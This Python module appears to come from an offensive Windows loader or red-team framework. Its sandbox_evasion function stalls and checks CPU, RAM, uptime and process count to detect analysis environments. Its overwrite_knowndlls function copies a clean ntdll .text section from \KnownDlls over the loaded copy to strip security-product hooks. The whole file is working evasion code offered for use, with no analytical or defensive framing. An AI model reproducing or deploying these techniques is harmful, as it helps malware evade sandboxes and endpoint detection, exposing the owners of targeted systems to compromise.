import time
import psutil
import ctypes
import ctypes.wintypes as wintypes
from ctypes import byref

from console import (
    print_status,
    print_step,
    print_success,
    print_warning,
    print_error,
    print_hex,
)

from utils import (
    kernel32,
    ntdll,
    SECTION_MAP_READ,
    PAGE_EXECUTE_WRITECOPY,
    OFFSET_MAPPED_DLL,
    OBJECT_ATTRIBUTES,
    create_unicode_string,
    get_local_lib_address,
)


def sandbox_evasion(
    time_delay, cpu_check=None, ram_check=None, uptime_check=None, process_check=None
):

    print_status("Sandbox Evasion")
    print_step(f"Delaying execution ({time_delay}s)")
    time.sleep(time_delay)

    logical_cores = psutil.cpu_count(logical=True)
    total_ram_gb = psutil.virtual_memory().total / (1024**3)
    uptime_minutes = (time.time() - psutil.boot_time()) / 60
    process_count = len(psutil.pids())

    if cpu_check and logical_cores < cpu_check:
        print_warning("CPU check failed")
        return False

    if ram_check and total_ram_gb < ram_check:
        print_warning("RAM check failed")
        return False

    if uptime_check and uptime_minutes < uptime_check:
        print_warning("Uptime check failed")
        return False

    if process_check and process_count < process_check:
        print_warning("Process count check failed")
        return False

    print_success("Host verified")
    return True


def overwrite_knowndlls():

    print_status("Restoring NTDLL")

    section_name = "\\KnownDlls\\ntdll.dll"
    section_handle = wintypes.HANDLE()
    unicode_string = create_unicode_string(section_name)
    object_attributes = OBJECT_ATTRIBUTES()
    object_attributes.Length = ctypes.sizeof(OBJECT_ATTRIBUTES)
    object_attributes.ObjectName = ctypes.pointer(unicode_string)

    print_step(f"Opening section: {section_name}")
    status = ntdll.NtOpenSection(
        byref(section_handle), SECTION_MAP_READ, byref(object_attributes)
    )

    if status != 0:
        print_error(f"NtOpenSection failed: {hex(status)}")
        return False

    clean_dll = kernel32.MapViewOfFile(section_handle, SECTION_MAP_READ, 0, 0, 0)
    local_ntdll = get_local_lib_address("ntdll.dll")
    target_text = local_ntdll + OFFSET_MAPPED_DLL

    print_step(f"Target .text: {print_hex(target_text)}")

    old_protection = wintypes.DWORD()

    kernel32.VirtualProtect(
        target_text, 4096, PAGE_EXECUTE_WRITECOPY, byref(old_protection)
    )

    print_step("Overwriting hooked bytes")
    ctypes.memmove(target_text, clean_dll + OFFSET_MAPPED_DLL, 4096)

    kernel32.VirtualProtect(target_text, 4096, old_protection, byref(old_protection))

    print_success("Unhooking complete")
    return True
